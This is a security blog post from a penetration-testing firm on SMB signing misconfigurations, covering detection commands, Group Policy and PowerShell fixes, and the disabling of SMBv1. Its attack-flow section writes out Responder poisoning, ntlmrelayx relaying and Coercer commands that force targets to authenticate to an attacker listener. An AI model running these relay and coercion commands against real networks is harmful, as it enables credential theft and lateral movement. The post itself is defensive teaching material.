---
image: "~/assets/images/smbrelay.webp"
title: How To Fix SMB Signing Vulnerabilities
excerpt: "SMB Relay attacks are like a game of telephone where everyone loses."
author: Staff
tags:
 - penetration testing
publishDate: 2024-11-25T00:00:00Z
---


# How to Fix SMB Signing Misconfigurations: Don't Pick Up the Telephone

At **Strategic Defense**, SMB signing misconfigurations are a frequent finding during our internal penetration tests. These vulnerabilities allow attackers to execute SMB relay 
attacks, often leading to administrative access on systems we shouldnt have access to. Even better, you can access systems using accounts you don't even have the password for. 
Tools like Responder, ntlmrelayx, and Coercer make exploiting these misconfigurations even easier.

SMB signing ensures authenticity and integrity of SMB packets. Without it, attackers can intercept, relay, or even coerce systems into authenticating to them. Fixing these 
vulnerabilities is a must for any organization aiming to prevent lateral movement and credential compromise.

---

### What is SMB Signing?
SMB signing is a security feature that cryptographically signs SMB communications, ensuring packets are from a legitimate source and haven't been tampered with. When SMB signing 
is not enforced:
1. Attackers can relay authentication requests to other systems (e.g., **SMB Relay** attacks).
2. Attackers can intercept and modify SMB communications.

---

### How SMB Signing is Exploited in Penetration Tests
#### **Tools of the Trade**
1. [**Responder**](https://github.com/lgandx/Responder): Captures NTLM hashes by responding to broadcast protocols like LLMNR and NetBIOS.
2. [**ntlmrelayx**](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): Relays captured credentials to other systems, bypassing authentication when SMB signing 
is not enforced.
3. [**Coercer**](https://github.com/p0dalirius/Coercer): If you have credentials, you can force machines to authenticate to an attacker-controlled SMB server by exploiting remote 
services like printers or scheduled 
tasks.

#### **Typical Attack Flow**

1. **Prep to relay NTLM Hashes with ntlmrelayx**
   - Use `ntlmrelayx.py` to relay captured NTLM hashes to other vulnerable systems:
   ```bash
   python3 ntlmrelayx.py -tf targets.txt --smb2support
   ```

2. **Intercept Authentication Requests with Responder**
   - Launch Responder to capture NTLM hashes by poisoning LLMNR or NetBIOS Name Service (NBT-NS).
   ```bash
   sudo responder -I eth0
   ```

3. **Alternatively, Force Authentication with Coercer (if you have credentials)**
   - You can use **Coercer** to trigger SMB authentication requests from remote systems to an attacker-controlled server, to then relay them to other systems. This can be helpful 
if you have a set of limited-permission credentials, and want to upgrade to say, a machine account or other privileged user. 
   ```bash
   python3 Coercer.py coherce -l <listener-ip> -t <target-ip> -u <username> -p <password> -d DOMAIN.local
   ```
   - This technique can be used in combination with tools like **ntlmrelayx** to execute relay attacks.

   Example output from Coercer might show SMB connections being initiated:
   ```
   [+] Coercing authentication via Print Spooler service.
   [*] Sending requests to \\<target-ip>\pipe\spoolss
   ```

---

### How to Detect SMB Signing Misconfigurations
#### **Manual Checks**
Use **PowerShell** to identify SMB signing configurations:

- **On Servers:**
  ```powershell
  Get-SmbServerConfiguration | Select EnableSecuritySignature, RequireSecuritySignature
  ```

- **On Clients:**
  ```powershell
  Get-SmbClientConfiguration | Select EnableSecuritySignature, RequireSecuritySignature
  ```
If “RequireSecuritySignature” says False, you’ve got a problem.


#### **Automated Scanning**
- **Nmap:**
  ```bash
  nmap --script smb-security-mode.nse -p445 <target-ip>
  ```
  Look for results indicating SMB signing is **optional** or **disabled**.

- **NetExec:**
  ```bash
  nxc smb <target-ip> --gen-relay-list targets.txt
  ```
  If the output suggests SMB signing is not required, those targets are vulnerable to relay attacks. This is the same way pentesters build SMB Relay attack lists to work from. 

- **Cohercer:**
  ```bash
  python3 Coercer.py scan -t <target-ip> -u username -p password -d DOMAIN.local -v
  ```
  Look for results indicating "Accessible", or requests hitting your Responder instance.

---

### How to Fix SMB Signing Misconfigurations
#### **1. Enforce SMB Signing**
Use Group Policy to enable and require SMB signing across your network:
- Navigate to **Computer Configuration > Administrative Templates > Network > Lanman Workstation**.
- Set:
  - **Enable security signatures**: Enabled.
  - **Require security signatures**: Enabled.

#### **2. Verify SMB Signing Configuration**
- On servers:
  ```powershell
  Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
  ```
- On clients:
  ```powershell
  Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
  ```

#### **3. Disable SMBv1**
SMBv1 is outdated and inherently insecure. Disable it:
```powershell
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

#### **4. Test the Configuration**
After making changes, rerun tools like **Responder** and **ntlmrelayx** to ensure SMB relay attacks are no longer possible.

---

### Common Challenges
One common challenge to enabling SMB Signing is **Legacy Systems**. Older devices may not support SMB signing, so isolate these systems or replace them. Ensuring they dont share 
credentials / authentication with other systems (i.e. Active Directory) can be a good move. This way if an attacker gets in a position to relay authentication attempts, they won't 
work (because the credentials arent shared) on the target vulnerable system.

---

### Conclusion
SMB signing misconfigurations are a gateway to serious internal network compromises. As password policies improve, testers (and threat actors) move towards relay attacks since 
they dont require the underlying password to be cracked in order to compromise the account. Tools like **Responder**, **ntlmrelayx**, and **Coercer** highlight the ease with which 
attackers can exploit these weaknesses. By enforcing SMB signing and hardening other SMB configurations, you can protect your organization from these attacks.

At **Strategic Defense**, we specialize in identifying and remediating vulnerabilities like these during our penetration tests. Contact us to learn how we can help secure your 
environment against advanced threats.
